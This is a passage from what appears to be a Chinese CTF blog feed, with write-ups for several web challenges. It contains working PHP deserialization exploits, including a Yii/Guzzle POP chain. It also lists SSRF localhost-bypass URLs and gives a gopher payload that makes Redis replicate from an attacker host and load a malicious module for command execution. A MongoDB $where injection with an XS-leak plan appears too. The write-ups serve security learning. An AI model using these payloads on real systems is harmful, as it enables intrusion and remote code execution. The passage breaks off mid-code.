class="hljs-string">&quot;date&quot;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>             <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>         &#125;<br>     &#125;<br> &#125;<br> <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br> <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>     <span class="hljs-variable">$func</span> = strtolower(<span class="hljs-variable">$func</span>);<br>     <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>         <span class="hljs-keyword">echo</span> gettime(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     &#125;<span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>     &#125;<br> &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>审计一下发现考的还是反序列化，直接exp：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br><span class="hljs-comment"># code...</span><br><span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-variable">$p</span>;<br><span class="hljs-keyword">$this</span>-&gt;func = <span class="hljs-variable">$func</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$demo</span> = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;ls /&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$demo</span>);<br><br></code></pre></div></td></tr></table></figure><p>最后尝试了flag在<code>/tmp/flagoefiu4r93</code></p><p><img src="https://img-blog.csdnimg.cn/c6551e040d3847e9b4a28b7527292673.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h1><p>参考文章</p><p><a href="https://zhuanlan.zhihu.com/p/147371417">https://zhuanlan.zhihu.com/p/147371417</a></p><p><a href="https://blog.csdn.net/gqtcgq/article/details/50273431">https://blog.csdn.net/gqtcgq/article/details/50273431</a></p><p><a href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p><p><a href="https://xz.aliyun.com/t/8163#toc-7">https://xz.aliyun.com/t/8163#toc-7</a></p><p><a href="https://xz.aliyun.com/t/5616">https://xz.aliyun.com/t/5616</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>尝试建立主从连接过程，首先在配置中修改</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">protected-mode 设置为<span class="hljs-literal">no</span>    允许外部ip访问<br>找到bind 127.0.0.1 注释掉，这个是redis服务绑定可访问的ip， 所以127.0.0.1之外的机器都访问不了此redis服务<br>firewall-cmd <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=6379/tcp --permanent   开放端口<br>注意在服务器防火墙上也得开放端口<br>daemonize 设置为<span class="hljs-literal">yes</span><br><br>然后启动redis-server 即可默认6379端口也可设置为其他端口<br></code></pre></div></td></tr></table></figure><p>从服务器会从服务器同步数据</p><p><img src="https://img-blog.csdnimg.cn/7ecc41366a34439392b9ce7f96f85983.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>写入文件</p><p><img src="https://img-blog.csdnimg.cn/a00e1cf3116445a7a41ac672f71cf406.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>原理</p><ul><li><code>slaveof</code>（新版改为<code>REPLICAOF</code>）建立后slave会向master发送<code>PSYNC</code>，请求开始复制</li><li>master可以返回<code>FULLRESYNC</code>，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括<code>Replication ID</code>, <code>offset</code>，master存储的key-value等等</li><li>slave会将这些数据保存到config中<code>dbfilename</code>指定的文件（默认为dump.rdb），然后再载入。</li><li>通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件</li><li>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</li><li>因此通过FULLRESYNC写入恶意so文件，然后<code>MODULE LOAD /path/to/mymodule.so</code>载入模块即可rce</li></ul><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>第一关绕过</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">parse_url与libcurl对url的解析差异绕过check_inner_ip函数对内网地址的判断<br>http:<span class="hljs-regexp">//u</span>:p@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span>@baidu.com/hint.php<br>还可以用<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>表示ipv4下所有ip地址<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/hint.php<br>http:<span class="hljs-regexp">//</span>[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>]<span class="hljs-regexp">//</span>hint.php<br>也可以DNS Rebinding。让域名在check_inner_ip的时候为外部地址，而curl请求的时候又变成内部IP。<br>https:<span class="hljs-regexp">//</span>lock.cmpxchg8b.com/rebinder.html<br></code></pre></div></td></tr></table></figure><p>网上也看到很多绕过技巧</p><p>利用URL的解析问题,</p><p>利用不存在的协议头绕过指定的协议</p><p>其他各种指向127.0.0.1的地址</p><p>进制的转换绕过内网IP</p><p>利用302跳转绕过内网IP</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/         # localhost就是代指<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>/                 # <span class="hljs-number">0</span>在window下代表<span class="hljs-number">0.0.0.0</span>，而在liunx下代表<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0.0.0.0</span>/       # <span class="hljs-number">0.0.0.0</span>这个IP地址表示整个网络，可以代表本机 ipv<span class="hljs-number">4</span> 的所有地址<br><span class="hljs-attribute">http</span>://[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0.0.1</span>]/    # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://[::]:<span class="hljs-number">80</span>/           # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>/       # 用中文句号绕过<br><span class="hljs-attribute">http</span>://①②⑦.⓪.⓪.①<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">1</span>/<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">001</span>/ # <span class="hljs-number">0</span>的数量多一点少一点都没影响，最后还是会指向<span class="hljs-number">127.0.0.1</span><br></code></pre></div></td></tr></table></figure><p>下一层源码，这里可以参考上面的文章，但考点不在这，几个payload打不通。这里可以看到有redis密码，应该是ssrf打redis。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">1342</span>) <span class="hljs-string">&quot; &lt;?php</span><br><span class="hljs-string">if(<span class="hljs-subst">$_SERVER</span>[&#x27;REMOTE_ADDR&#x27;]===&quot;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&quot;)&#123;</span><br><span class="hljs-string">  highlight_file(__FILE__);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">if(isset(<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;]))&#123;</span><br><span class="hljs-string">  file_put_contents(<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;],&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;redispass is root&#x27;</span>;<span class="hljs-keyword">exit</span>();<span class="hljs-string">&quot;.<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;]);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><p>考点最后是redis主从复制来getshell，两个自动化脚本</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>第二个项目中打ssrf的需要根据服务器改一下ip，rce命令也可以改，由于需要绕过第一层gopher访问的ip也要改成0.0.0.0.并且将第一个项目的exp.so上传到同目录。buu小号开一个服务器，下载两个项目，生成payload，解码看一下,手动打也差不多按这个。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">gopher:<span class="hljs-comment">//0.0.0.0:6379/_*2</span><br>$<span class="hljs-number">4</span><br>AUTH<br>$<span class="hljs-number">4</span><br>root   <span class="hljs-comment">//这里先认证</span><br>*<span class="hljs-number">3</span><br>$<span class="hljs-number">7</span><br>SLAVEOF<br>$<span class="hljs-number">14</span><br><span class="hljs-number">172.16</span>.<span class="hljs-number">152.217</span>   <span class="hljs-comment">//将服务器设置为主服务器</span><br>$<span class="hljs-number">4</span><br><span class="hljs-number">6666</span><br>*<span class="hljs-number">4</span><br>$<span class="hljs-number">6</span><br>CONFIG      <span class="hljs-comment">//设置目录</span><br>$<span class="hljs-number">3</span><br>SET<br>$<span class="hljs-number">3</span><br>dir<br>$<span class="hljs-number">5</span><br>/tmp/<br>*<span class="hljs-number">4</span><br>$<span class="hljs-number">6</span><br>config<br>$<span class="hljs-number">3</span><br>set<br>$<span class="hljs-number">10</span><br>dbfilename<br>$<span class="hljs-number">6</span><br>exp.so      <span class="hljs-comment">//上传exp.so</span><br>*<span class="hljs-number">3</span><br>$<span class="hljs-number">6</span><br>MODULE   <span class="hljs-comment">//加载so文件</span><br>$<span class="hljs-number">4</span><br>LOAD<br>$<span class="hljs-number">11</span><br>/tmp/exp.so<br>*<span class="hljs-number">2</span><br>$<span class="hljs-number">11</span><br>system.exec   <span class="hljs-comment">//执行命令</span><br>$<span class="hljs-number">14</span><br>cat$&#123;IFS&#125;/flag<br>*<span class="hljs-number">1</span><br>$<span class="hljs-number">4</span><br>quit<br><br></code></pre></div></td></tr></table></figure><p>生成payload后再buu服务器上开启redis服务<code> python rogue-server.py</code>等待连接，回复<code>FULLRESYNC</code>进行全量复制。但很奇怪没有打出来。</p><p><img src="https://img-blog.csdnimg.cn/1b9cb559e7e14dadad6f35f41e12fc59.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>前面已经返回ok了，到load so文件时出错了。。。。这里卡了很久，后来发现是buu靶机上没有git命令我用xshell传上去的，可能是so文件的问题。exp.so没有成功加载到从服务器上，不知道是不是buu环境的问题。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯</title>
    <link href="/2021/08/30/2021-8-30-%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <url>/2021/08/30/2021-8-30-%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="EZyii"><a href="#EZyii" class="headerlink" title="EZyii"></a>EZyii</h1><p>百度的链子可以直接打<a href="https://xz.aliyun.com/t/9948#toc-5">https://xz.aliyun.com/t/9948#toc-5</a></p><p><code>stopProcess</code> 方法中存在</p><p>利用 返回值可控的<code>__call</code> 和 字符串连接符 <code>.</code> ，将目标转向<code>__toString</code>，</p><p>在这里找到了可利用点，跟进 <code>rewind</code></p><p>下面断点的地方又可以走向其他类中的 <code>rewind</code> 方法，</p><p>在这里可以看到很相似的调用。</p><p>跟进 <code>read</code> 方法</p><p>又要跳向其他类的 <code>read</code> 方法。</p><p>利用<code>call_user_func</code>执行命令</p><p>exp如下:</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Psr7</span>\<span class="hljs-title">AppendStream</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$output</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$processes</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes[]=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-keyword">new</span> AppendStream());<br>            <span class="hljs-keyword">$this</span>-&gt;output=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-string">&#x27;jiang&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">DefaultGenerator</span><br>&#123;<br>    <span class="hljs-title">protected</span> $<span class="hljs-title">default</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;default = <span class="hljs-variable">$default</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Psr7</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">DefaultGenerator</span>;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppendStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$streams</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$seekable</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;streams[]=<span class="hljs-keyword">new</span> CachingStream();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CachingStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$remoteStream</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;remoteStream=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;stream=<span class="hljs-keyword">new</span>  PumpStream();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PumpStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>=-<span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$buffer</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;buffer=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-string">&#x27;j&#x27;</span>);<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;closure/autoload.php&quot;</span>);<br>            <span class="hljs-variable">$a</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;phpinfo();&#125;;<br>            <span class="hljs-variable">$a</span> = \Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-variable">$b</span> = unserialize(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;source=<span class="hljs-variable">$b</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Package-Manager"><a href="#Package-Manager" class="headerlink" title="Package Manager"></a>Package Manager</h1><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>题目给了源码，审计一下，题目的界面里面有许多文本框，这里猜测可不可以xss一下，找到了源码，找到了许多，但都加了#转义，找到了一个！未转义的。</p><p><img src="https://img-blog.csdnimg.cn/4141920159f046c6a6391a43732bb238.png" alt="在这里插入图片描述"></p><p>但是后来又在<code>app.ts</code>里面发现了csp防御很严格，基本无法实现xss。</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript">app.use(<span class="hljs-function">(<span class="hljs-params">req: Request, res: Response, next: NextFunction</span>) =&gt;</span> &#123;<br>    res.locals.session = req.session;<br>    res.locals.csrfToken = req.csrfToken();<br>    res.set(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);<br>    res.set(<span class="hljs-string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="hljs-string">&#x27;nosniff&#x27;</span>);<br>    next();<br>&#125;);<br></code></pre></div></td></tr></table></figure><blockquote><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，<strong>哪些外部资源可以加载和执行，</strong>等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p><p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p><p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的Content-Security-Policy的字段。</p><ul><li><p><code>default-src</code> 限制全局,默认所有都会使用这种规则</p></li><li><p><code>script-src</code> 限制JavaScript的源地址。</p></li><li><p><code>style-src</code> 限制层叠样式表文件源。</p></li><li><p><code>img-src</code> 限制图片和图标的源地址等等</p></li></ul><p> 例如 <strong>default-src ‘self’;</strong>  <strong>只允许同源下的资源</strong></p><p> <strong>script-src ‘self’;</strong> <strong>只允许同源下的js</strong></p><p> <strong>none</strong>  <strong>不允许任何内容。</strong></p></blockquote><p>但是这里可以插入<code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;2; URL=http://example.com/&quot; /&gt;</code> </p><p>然后直接全局搜索了下flag，发现flag再admin用户里面的一个page页面上。题目也提供了admin 的xssbot，且用的是火狐浏览器。那么现在情景就是，我们需要某种方式获得admin页面的内容。</p><p><img src="https://img-blog.csdnimg.cn/58b8441334b64f44b9189a2d2a318c5a.png" alt="在这里插入图片描述"></p><p>下面的操作就让我学习了很久，突破口在packages路由中<code>/list</code>操作里面。这里接受了查询的search参数，然后用find查询。这里用的<code>mongoose</code>查询，可以用<code>&#123;&#39;$regex&#39;:xxx&#125;</code>实现查询，所以这里可以这样传入<code>/packages/list?search[description][$regex]=</code>来进行异或匹配flag。</p><blockquote><p>这样就符合xsleak的思路了。</p><p>而具体leak的方法。我们使用<code>object</code>标签。它能在火狐环境下做到，如果<code>object.data</code>访问状态码200，就会触发onload事件。如果访问状态码404，就会触发onerror事件。我们根据这个差异性，就能利用search注出flag内容了。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/f32b2d870bd64daa973fc23ffb103040.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但是这里还有个问题就是需要将url提交给admin，这里有个<code>auth</code>的过滤，$where操作需要让token和admin密码的hex_md5后的值相等，正常说这显然不太可能，所以这里想到污染$where操作，同样可以使用<code>/packages/list?search[$where]=hex_md5=function()&#123;return &#39;202cb962ac59075b964b07152d234b70&#39;&#125;</code>真是太神奇了。</p><p><img src="https://img-blog.csdnimg.cn/1157c81da0c64307bf71295878e96701.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>贴一下wp的测试</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;Math.floor = function () &#123; return 1 &#125;; return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;poyo&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;byc&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;byc&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br><span class="hljs-keyword">null</span><br></code></pre></div></td></tr></table></figure><p>到这里思路大致就是先注册，然后add一篇文章，在description插入重定向到我们自己vps上的js脚本用模糊匹配出flag，然后在admin下提交我们的page，让bot访问我们重定向的脚本，来获取flag。</p><p>先注册然后发一篇文章，重定向到我们的vps。server上写</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 